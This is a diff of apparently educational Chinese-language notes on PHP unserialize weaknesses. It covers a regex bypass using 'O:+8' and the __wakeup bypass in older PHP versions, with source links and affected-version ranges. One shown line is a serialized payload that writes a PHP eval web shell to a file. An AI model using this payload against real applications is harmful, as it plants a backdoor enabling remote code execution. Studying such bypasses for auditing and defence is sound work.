@@ -1,18 +1,28 @@
-## unserialize
+# unserialize
 
-参考文章：
+**参考文章：**
+
 - https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day11/files/README.md
 - https://secure.php.net/manual/zh/function.unserialize.php
 - https://www.cnblogs.com/Mrsm1th/p/6835592.html
 
-函数结构：
+**函数结构：**
+
 ```php
 unserialize ( string $str ) : mixed
 ```
 
 ## O类绕过
 
+#### 利用范围
+
+- PHP7<PHP7.2（没有测试具体测试是在PHP7.2.x的哪个小版本修复的）
+- PHP5
+
+#### 测试代码
+
 可以绕过正则检测：
+
 ```
 a:1:{i:0;O:+8:"Template":2:{s:9:"cacheFile";s:10:"./test.php";s:8:"template";s:25:"<?php eval($_POST[xx]);?>";}}
 ```
@@ -22,9 +32,16 @@ print_r(unserialize('a:1:{i:0;O:+8:"Template":2:{s:9:"cacheFile";s:10:"./test.ph
 ```
 
 ## wakeup绕过
-（PHP before 5.6.25 and 7.x before 7.0.10）  
+
+#### 利用范围
+
+- PHP before 5.6.25 
+-  7.x before 7.0.10）  
+
+#### 测试代码
+
 表示属性的个数大于真实的个数时，wakep魔术方法不会被执行，官方demo  
-demo.php
+
 ```php
 <?php
 class test{
